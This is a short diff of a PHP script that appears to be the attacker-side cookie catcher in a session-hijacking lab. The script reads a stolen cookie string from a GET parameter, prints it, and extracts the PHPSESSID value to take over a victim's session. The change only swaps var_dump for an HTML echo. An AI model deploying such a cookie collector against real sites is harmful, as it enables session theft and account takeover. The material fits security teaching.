@@ -3,7 +3,7 @@
 $victimURL = "http://phpinfosec/session_hijacking/index.php";
 $stolenCookie = $_GET['cookies'];
 
-var_dump($stolenCookie);
+echo "<h1>Stolen cookie:</h1><pre>$stolenCookie</pre>";
 $stolenCookies = preg_split('/;/', $stolenCookie);
 foreach ($stolenCookies as $stolenCookie) {
 	if ( false !== ( $pos = strpos($stolenCookie, 'PHPSESSID') ) ) {
